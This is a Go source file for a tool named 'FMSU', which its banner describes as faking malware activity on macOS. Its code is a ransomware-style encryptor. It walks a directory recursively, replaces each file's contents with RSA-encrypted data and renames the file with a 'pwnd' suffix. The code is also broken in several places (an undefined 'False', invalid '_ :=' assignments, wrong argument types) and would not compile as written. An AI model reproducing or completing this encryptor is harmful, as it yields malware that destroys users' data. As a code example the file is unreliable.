package main

import (
	"encoding/base64"
	"crypto/sha256"
	"crypto/rand"
	"crypto/rsa"
	"fmt"
	"os"
)

func Banner() {
	// A banner for fun
	fmt.Println("	            .         .                                        ")
	fmt.Println("8 8888888888       ,8.       ,8.            d888888o.   8 8888      88 ")
	fmt.Println("8 8888            ,888.     ,888.         .`8888:' `88. 8 8888      88 ")
	fmt.Println("8 8888           .`8888.   .`8888.        8.`8888.   Y8 8 8888      88 ")
	fmt.Println("8 8888          ,8.`8888. ,8.`8888.       `8.`8888.     8 8888      88 ")
	fmt.Println("8 888888888888 ,8'8.`8888,8^8.`8888.       `8.`8888.    8 8888      88 ")
	fmt.Println("8 8888        ,8' `8.`8888' `8.`8888.       `8.`8888.   8 8888      88 ")
	fmt.Println("8 8888       ,8'   `8.`88'   `8.`8888.       `8.`8888.  8 8888      88 ")
	fmt.Println("8 8888      ,8'     `8.`'     `8.`8888.  8b   `8.`8888. ` 8888     ,8P ")
	fmt.Println("8 8888     ,8'       `8        `8.`8888. `8b.  ;8.`8888   8888   ,d8P  ")
	fmt.Println("8 8888    ,8'         `         `8.`8888. `Y8888P ,88P'    `Y88888P'   ")

	fmt.Println("\nFMSU let you fake some malware activity on mac os, enjoy !")
	fmt.Println("Made By Denis <cr1ng3> REMACLE\n")
}

func KeyGen() (rsa.PublicKey, rsa.PrivateKey) {
	// key generation
	priv_key, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		fmt.Println("Could not generate Keys")
		os.Exit(1)
	}
	pub_key := priv_key.PublicKey
	return pub_key, *priv_key
}

func Encryption(to_Encrypt string, user_pub_key rsa.PublicKey) (string) {
	//Encrypt outgoing data
	data := []byte(to_Encrypt)
	rng := rand.Reader

	ciphertext, err := rsa.EncryptOAEP(sha256.New(), rng, &user_pub_key, data, nil)
	if err != nil {
		fmt.Printf("Error from encryption: %s\n", err)
		return "Encryption error"
	}
	return string(ciphertext)
}

func Decryption(to_Decrypt string, server_priv_key rsa.PrivateKey) (string) {
	//Decrypt incoming data
	data := []byte(to_Decrypt)
	rng := rand.Reader

	plaintext, err := rsa.DecryptOAEP(sha256.New(), rng, &server_priv_key, data, nil)
	if err != nil {
		fmt.Println("Decryption error : a user must've disconnected himself")
		return "Decryption error"
	}
	return string(plaintext)
}

func DirectoryNavigation(directory string, pub_key rsa.PublicKey, priv_key rsa.PrivateKey) {
	c, _ := os.ReadDir(directory)

    for _, entry := range c {
		if entry.IsDir() == False {
			data, _ := os.ReadFile(entry)
			encoded_data:= base64.StdEncoding.EncodeToString([]byte(data))
			ciphertext := Encryption(encoded_data, pub_key)
			_ := os.WriteFile(entry, ciphertext)
			_ := os.Rename(entry, entry+"pwnd")
		} else {
			go DirectoryNavigation(entry, pub_key, priv_key)
		}
    }

}

func main() {
	Banner()

	pub_key, priv_key = KeyGen()
	DirectoryNavigation("/home/cr1ng3/test", pub_key, priv_key)

}